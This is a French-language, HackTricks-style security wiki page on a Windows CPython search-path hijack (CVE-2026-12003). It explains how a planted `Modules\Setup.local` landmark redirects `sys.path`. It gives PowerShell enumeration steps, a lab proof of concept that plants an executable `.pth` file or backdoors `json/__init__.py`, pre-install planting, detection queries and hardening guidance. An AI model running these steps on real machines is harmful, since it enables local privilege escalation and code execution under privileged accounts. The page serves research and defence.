# Windows CPython Build-Landmark et détournement de `sys.path`

{{#include ../../../banners/hacktricks-training.md}}

Un runtime peut conserver des chemins relatifs qui étaient destinés uniquement à son arborescence de build. Si un runtime privilégié installé résout l'un de ces chemins vers un répertoire accessible en écriture par un utilisateur à faibles privilèges, un attaquant peut placer le **build landmark** attendu et amener le runtime à faire confiance à un préfixe de bibliothèque alternatif. CVE-2026-12003 est un exemple Windows avec CPython : un fichier `Modules\Setup.local` placé par l'attaquant peut rediriger l'entrée de la bibliothèque standard dans `sys.path` sans modifier l'installation Python protégée.<sup>[[1]](#references)[[2]](#references)</sup>

## Chaîne de construction des chemins de CPython

Les builds Windows concernés ont été compilés avec `VPATH=..\..` et l'ont exposé sous la forme de `sys._vpath`. Le fallback vulnérable dans `Modules/getpath.py` traitait `VPATH\Modules\Setup.local` comme la preuve que l'interpréteur s'exécutait depuis une arborescence source ; le flux de données suivant transforme cette valeur de build-time en primitive de runtime search-path.<sup>[[1]](#references)[[2]](#references)</sup>

| Étape | Valeur dérivée pour `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Chemin de build compilé | `VPATH=..\..` |
| Build landmark du runtime | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Build landmark créé par l'attaquant | `C:\Modules\Setup.local` |
| `build_prefix` sélectionné | `C:\` |
| Bibliothèque standard sélectionnée | `C:\Lib` |
| Résultat | `C:\Lib`, contrôlé par l'attaquant, est ajouté à `sys.path` |

Cette vérification est un fallback utilisé lorsque le fichier `pybuilddir.txt` plus spécifique situé à côté de l'exécutable est absent ou illisible. Cela est important, car un utilisateur à faibles privilèges peut ne pas pouvoir modifier `C:\Program Files\Python314`, tout en pouvant créer de nouveaux répertoires à la racine de `C:\`. Le processus `python.exe` privilégié lancé ultérieurement charge du code Python avec son propre access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Conditions préalables

Traitez ceci comme une frontière de privilèges uniquement lorsque toutes les conditions suivantes sont réunies :<sup>[[1]](#references)[[2]](#references)</sup>

- La cible est un build **Windows CPython** concerné ; la logique de chemin vulnérable n'est pas une propriété du langage Python.
- Le répertoire obtenu en résolvant `..\..` depuis le répertoire contenant `python.exe` permet à un utilisateur moins privilégié de créer le landmark ainsi que l'arborescence `Lib`.
- Un utilisateur disposant de privilèges plus élevés, un service, un installateur ou un compte de software-deployment lance ensuite cet interpréteur.
- Aucune configuration de path-isolation ne remplace le chemin de découverte vulnérable.

## Énumération

Inspectez à la fois la valeur compilée et le search path effectif. Une valeur `..\..` exposée constitue une piste utile, mais ne prouve pas l'exploitabilité : résolvez également le chemin, testez les ACL et confirmez qu'un landmark placé se trouverait en dehors de l'installation protégée.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Ne limitez pas l'évaluation aux installateurs officiels. Pour chaque produit qui inclut `python.exe`, résolvez son `sys._vpath` par rapport au répertoire réel de l'exécutable et vérifiez les ACL sur les emplacements `Modules` et `Lib` résultants. Un chemin d'installation plus profond peut pointer vers un autre répertoire d'application ou de fournisseur accessible en écriture, plutôt que vers `C:\`.<sup>[[1]](#references)</sup>

## Workflow d'exploitation en laboratoire

Le PoC de laboratoire suivant reproduit suffisamment l'environnement Python légitime sous le préfixe sélectionné pour permettre l'initialisation de Python, ajoute une ligne `.pth` exécutable, puis crée le repère. Créez la payload avant le repère afin d'éviter de laisser temporairement l'interpréteur pointer vers une arborescence de bibliothèques incomplète.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Lors de l'initialisation normale d'un site, Python traite les fichiers `.pth` dans les répertoires `site-packages` reconnus. Seules les lignes commençant par `import` suivi d'un espace sont exécutées, et l'instruction exécutable doit rester sur une seule ligne physique ; `python -S` supprime l'import automatique de `site` et désactive donc ce trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Alternative déclenchée par l'import

L'exécution au démarrage n'est pas obligatoire. Après avoir reproduit l'arborescence légitime de la bibliothèque, backdoorisez un module qu'un script privilégié importe de manière prévisible. Par exemple, l'ajout de code dans le `Lib\json\__init__.py` implanté s'exécute lorsque la victime importe `json` ; choisir un module fiable, mais qui n'est pas importé universellement, peut rendre le trigger moins bruyant.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Cette variante hérite toujours du token du processus d’importation, mais elle dépend du fait que l’application cible importe le module modifié. Préservez le comportement du module d’origine lors des tests sur des logiciels réels, sans quoi l’importation peut échouer avant la fin du workflow privilégié prévu.<sup>[[1]](#references)</sup>

## Préparation avant installation

Le planting du search path peut précéder l’installation. Un utilisateur disposant de faibles privilèges peut préparer l’arborescence `Lib` future ainsi que `Modules\Setup.local`, puis attendre qu’un portail logiciel privilégié, un workflow du support ou un système de déploiement effectue une installation pour tous les utilisateurs. Les installateurs qui lancent le nouvel interpréteur pour installer des packages ou précompiler la bibliothèque standard peuvent déclencher le payload sous le compte de déploiement, sans qu’un administrateur ouvre manuellement Python.<sup>[[1]](#references)</sup>

Cela modifie également la revue du déploiement : inspectez les ancêtres inscriptibles ainsi que les répertoires landmark/library déjà présents **avant** d’installer ou de mettre à niveau un runtime intégré, au lieu de vérifier uniquement le répertoire d’installation final après le déploiement.<sup>[[1]](#references)</sup>

## Détection et renforcement

Les pivots utiles sur l’hôte sont le landmark et l’arborescence library inattendus, suivis du lancement privilégié de Python. Recherchez `Modules\Setup.local`, les fichiers `Lib\site-packages\*.pth` situés à la racine ou à un autre emplacement inhabituel, les packages de la bibliothèque standard copiés et les fichiers de module dont le propriétaire ou la date de création diffère de ceux de l’installation protégée. Corrélez leur création par un utilisateur standard avec le lancement d’un `python.exe` élevé qui démarre `cmd.exe`, `powershell.exe`, des outils de gestion des comptes ou d’autres processus enfants inhabituels.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Le correctif en amont supprime le fallback `VPATH\Modules\Setup.local` et fait de `pybuilddir.txt` le seul indicateur de l'arbre de build. Préférez un build fixe ou une installation par utilisateur gérée avec le gestionnaire d'installation Python actuel. Lorsqu'une mise à niveau est temporairement impossible, protégez l'ancêtre résolu et pré-créez `Modules` avec des ACL restrictives ; des fichiers `._pth` contrôlés ou `PYTHONHOME` peuvent également modifier la découverte, mais nécessitent des tests de compatibilité de l'application.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003 : détournement du chemin de recherche de Windows CPython et élévation de privilèges locale](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [Problème CPython #151544 - Les chemins de recherche dans l'arbre source peuvent être activés sans modifier le répertoire d'installation](https://github.com/python/cpython/issues/151544)
- [3] [Pull request CPython #151545 - Supprimer le fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Documentation Python - fichiers de configuration du chemin `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
